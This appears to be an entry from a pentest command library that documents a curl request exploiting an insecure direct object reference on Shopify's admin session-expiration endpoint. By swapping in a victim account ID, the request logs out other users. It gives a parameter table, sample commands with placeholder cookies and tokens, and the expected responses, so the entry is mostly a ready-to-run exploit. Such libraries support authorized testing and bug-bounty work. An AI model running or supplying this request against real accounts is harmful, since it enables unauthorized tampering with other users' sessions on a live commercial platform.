---
data: >-
  curl -X POST
  'https://admin.shopify.com/admin/settings/account/expire_specific_users_sessions/{victim_id}'
  -H 'Cookie: _shopify_s=session_token' -H 'Content-Type:
  application/x-www-form-urlencoded' -d
  'utf8=%E2%9C%93&_method=patch&authenticity_token={token}'
tags:
  - web-exploit
  - curl
  - idor
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:29.780Z'
id: ad762f34-d924-40a3-88e5-333fd9770d22
verified: false
validated: true
submitted: true
---
# expire-user-sessions-curl

## Command

```bash
curl -X POST 'https://admin.shopify.com/admin/settings/account/expire_specific_users_sessions/{victim_id}' \
  -H 'Cookie: _shopify_s=session_token' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'utf8=%E2%9C%93&_method=patch&authenticity_token={token}'
```

## Description

This curl command simulates the POST request to Shopify's session expiration endpoint, targeting a specific account ID via IDOR. It requires a valid authenticity token and session cookie from an authenticated admin session.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `{victim_id}` | The target account ID to expire sessions for | Yes |
| `_shopify_s=session_token` | Attacker's session cookie header | Yes |
| `authenticity_token={token}` | CSRF token from captured request | Yes |
| `utf8=%E2%9C%93` | UTF-8 encoding parameter | Yes |
| `_method=patch` | HTTP method override | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://admin.shopify.com/admin/settings/account/expire_specific_users_sessions/1234567' \
  -H 'Cookie: _shopify_s=abc123' \
  -d 'utf8=%E2%9C%93&_method=patch&authenticity_token=def456'
```

### Advanced Usage

Add verbose output and follow redirects:

```bash
curl -v -L -X POST 'https://admin.shopify.com/admin/settings/account/expire_specific_users_sessions/1234567' \
  -H 'Cookie: _shopify_s=abc123' \
  -H 'Referer: https://admin.shopify.com/admin/settings/account' \
  -d 'utf8=%E2%9C%93&_method=patch&authenticity_token=def456'
```

## Expected Output

Successful execution returns HTTP 200 OK with a response body indicating session update, such as a success message or redirect to settings page. Failure may show 403 Forbidden if token invalid or 422 Unprocessable if params missing.

## Related

- [[Related Procedure|procedures/Modify-Request-with-Victim-Account-ID]]
- [[Related Procedure|procedures/Forward-Modified-Request-and-Verify-Logout]]
